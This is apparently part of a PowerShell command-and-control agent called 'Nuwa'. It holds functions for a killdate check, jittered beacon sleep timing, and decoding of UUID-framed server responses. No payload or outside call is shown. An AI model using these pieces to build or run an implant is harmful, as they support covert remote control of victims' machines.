function Test-NuwaKilldatePassed {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [string]$Killdate
    )

    if ([string]::IsNullOrWhiteSpace($Killdate)) {
        return $false
    }

    return (Get-Date) -ge (Get-Date -Date $Killdate)
}

function Get-NuwaSleepDurationSeconds {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [double]$Interval,

        [Parameter(Mandatory = $true)]
        [double]$Jitter,

        [Parameter(Mandatory = $false)]
        [double]$JitterSample = -1
    )

    if ($Jitter -le 0) {
        return [double]$Interval
    }

    $sample = if ($JitterSample -ge 0) {
        $JitterSample
    } else {
        (Get-Random -Minimum 0.0 -Maximum 1.0)
    }

    return [Math]::Round(($Interval + ($Interval * ($Jitter / 100.0) * $sample)), 3)
}

function Resolve-NuwaResponseBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [AllowNull()]
        [object]$ResponseBody,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedUuid,

        [Parameter(Mandatory = $true)]
        [hashtable]$Context,

        [Parameter(Mandatory = $false)]
        [int]$UuidLength = 36
    )

    if ($null -eq $ResponseBody) {
        return $null
    }
    $framingCandidates = @(
        Get-NuwaTransportResponseCandidates `
            -ResponseBody $ResponseBody `
            -ExpectedUuid $ExpectedUuid `
            -UuidLength $UuidLength
    )

    $matches = @()
    foreach ($framingCandidate in $framingCandidates) {
        try {
            $decodedJson = ConvertFrom-NuwaWireBytes `
                -WireBytes ([byte[]]$framingCandidate.WireBytes) `
                -Context $Context
            $matches += @{
                Json = [string]$decodedJson
                WireBody = $framingCandidate.WireBody
                CodecProfile = [string]$script:NuwaConfig.CodecProfile
                Framing = [string]$framingCandidate.Framing
                Uuid = [string]$framingCandidate.Uuid
            }
        } catch {
            continue
        }
    }

    if ($matches.Count -eq 0) {
        throw 'No Nuwa codec accepted the wire payload'
    }
    if ($matches.Count -gt 1) {
        $matchingCandidates = (($matches | ForEach-Object {
            '{0}/{1}' -f ([string]$_.Framing), ([string]$_.CodecProfile)
        }) -join ', ')
        throw ("Ambiguous Nuwa wire payload: {0}" -f $matchingCandidates)
    }
    return $matches[0]
}

function ConvertFrom-NuwaResponseBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [AllowNull()]
        [object]$ResponseBody,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedUuid,

        [Parameter(Mandatory = $true)]
        [hashtable]$Context,

        [Parameter(Mandatory = $false)]
        [int]$UuidLength = 36
    )

    $resolved = Resolve-NuwaResponseBody `
        -ResponseBody $ResponseBody `
        -ExpectedUuid $ExpectedUuid `
        -Context $Context `
        -UuidLength $UuidLength
    if ($null -eq $resolved) {
        return $null
    }
    return [string]$resolved.Json
}
